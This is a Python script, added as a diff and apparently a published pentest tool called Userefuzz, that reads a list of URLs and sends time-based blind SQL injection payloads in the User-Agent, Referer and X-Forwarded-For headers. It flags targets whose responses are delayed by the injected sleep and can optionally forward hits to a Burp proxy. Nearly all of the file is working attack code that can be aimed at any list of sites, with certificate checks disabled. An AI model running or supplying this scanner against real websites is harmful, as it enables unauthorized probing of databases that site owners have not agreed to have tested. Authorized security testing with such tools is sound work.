@@ -1,0 +1,119 @@
+#!/usr/bin/env python3
+# Author = Tanishq Rathore (Kun)
+# V = 1.0.0
+
+# Importing 
+import requests
+import argparse
+import urllib3
+import urllib
+import threading
+
+
+
+# For SSL issues
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Colors
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+# Banner
+banner=f"""{bcolors.OKBLUE}
+                                   _____                     
+ __ __  ______ ___________   _____/ ____\_ __________________
+|  |  \/  ___// __ \_  __ \_/ __ \   __\  |  \___   /\___   /
+|  |  /\___ \\\\  ___/|  | \/\  ___/|  | |  |  //    /  /    / 
+|____//____  >\___  >__|    \___  >__| |____//_____ \/_____ \\
+           \/     \/            \/                 \/      \/
+                                    
+ [ 💉💉💉 {bcolors.BOLD} Basic Header SQLI Injection Tester{bcolors.OKBLUE} 💉💉💉 ]
+
+😍 {bcolors.BOLD}Made with ❤️  By [🤵 Tanishq Rathore] Kun 🐱‍🚀 {bcolors.OKBLUE}
+»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»{bcolors.ENDC}{bcolors.BOLD}
+🌟 {bcolors.WARNING}STAR  ❯ https://github.com/userefuzz
+🐦 {bcolors.WARNING}Twitter ❯ https://twitter.com/root_tanishq{bcolors.OKBLUE}{bcolors.BOLD}
+»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
+{bcolors.ENDC}"""
+print(banner)
+
+# Arguments
+parser = argparse.ArgumentParser()
+parser.add_argument('-l','--list', type=argparse.FileType('r'),help='📄_List of URL to check for User-Agent and Referer SQL Injection \n \t -l urllist.txt',required=True)
+parser.add_argument('-p','--proxy', type=str,help='✈️ _Burp proxy or any other proxy to send the request \n \t -p http://127.0.0.1:9090',default="no-proxy")
+parser.add_argument('-m','--message', type=str,help='✉️ _Send a message in header for ease of search in Burp history \n \t -m "Just Testing SQLI"',default="Testing for SQLI in User-Agent and Referer Header")
+parser.add_argument('-i','--inject', type=str,help="""💉_Send your custom payload for SQL Injection \n \t -m "'+sleep(10)+'" \n \t By default the best are used""" , default="default-payload")
+parser.add_argument('-s','--sleep', type=int,help="""😴_How much sleep is used in your custom payload \n \t -s 12 """ , default=10)
+args = parser.parse_args()
+
+
+# Creating a session for requests
+def sqli_request(url):
+    if args.inject == "default-payload":
+        try:
+            s = requests.Session()
+            headers = {"User-Agent": '"XOR(if(now()=sysdate(),sleep(5),0))XOR"' ,"Referer" : "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z","X-Forwarded-For":"0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" ,"Useref":args.message}
+            burp_proxy={"http":args.proxy, "https":args.proxy}
+            testrequest = s.get(url , headers=headers , verify=False )
+            sleeptestrequest = testrequest.elapsed.total_seconds()  
+            if sleeptestrequest >= 10:
+                if args.proxy != "no-proxy":
+                    try:
+                        ogrequest = s.get(url , headers=headers , proxies=burp_proxy , verify=False , timeout=0.000000000001)
+                    except:
+                        pass
+                print(f"{bcolors.OKGREEN}💉💉 URL : [ ", url , " ] \t \t \t Time Taken: [ ",sleeptestrequest ,f" ]{bcolors.ENDC}")
+            else:
+                print(f"{bcolors.FAIL}URL : [ ", url , " ] \t \t \t Time Taken: [ ",sleeptestrequest ,f" ]{bcolors.ENDC}")
+        except KeyboardInterrupt:
+            exit(0)
+        except:
+            print(f"{bcolors.FAIL}Error in : [", url , f"]{bcolors.ENDC}")
+    else:
+        try:
+            s = requests.Session()
+            headers = {"User-Agent": args.inject ,"Referer" : args.inject, "X-Forwarded-For": args.inject,"Useref":args.message}
+            burp_proxy={"http":args.proxy, "https":args.proxy}
+            testrequest = s.get(url , headers=headers , verify=False )
+            sleeptestrequest = testrequest.elapsed.total_seconds()  
+            if sleeptestrequest >= args.sleep:
+                if args.proxy != "no-proxy":
+                    try:
+                        ogrequest = s.get(url , headers=headers , proxies=burp_proxy , verify=False ,timeout=0.000000001)
+                    except:
+                        pass
+                print(f"{bcolors.OKGREEN}💉💉 URL : [ ", url , " ] \t \t \t Time Taken: [ ",sleeptestrequest ,f" ]{bcolors.ENDC}")
+            else:
+                print(f"{bcolors.FAIL}URL : [ ", url , " ] \t \t \t Time Taken: [ ",sleeptestrequest ,f" ]{bcolors.ENDC}")
+        except KeyboardInterrupt:
+            exit(0)
+        except:
+            print(f"{bcolors.FAIL}Error in : [", url , f"]{bcolors.ENDC}")
+
+# Crearing a threading process
+def Userefuzz_main(url2):
+    t = threading.Thread(target=sqli_request(url2))
+    t.start()
+
+# Opening the list of URL file
+urlfile = args.list.read()
+urltestlist = urlfile.split("\n")
+urllist = filter(None , urltestlist)
+# Main requests loop
+def main():
+    for url1 in urllist:
+        Userefuzz_main(url1) 
+
+
+
+# Calling main function
+main()
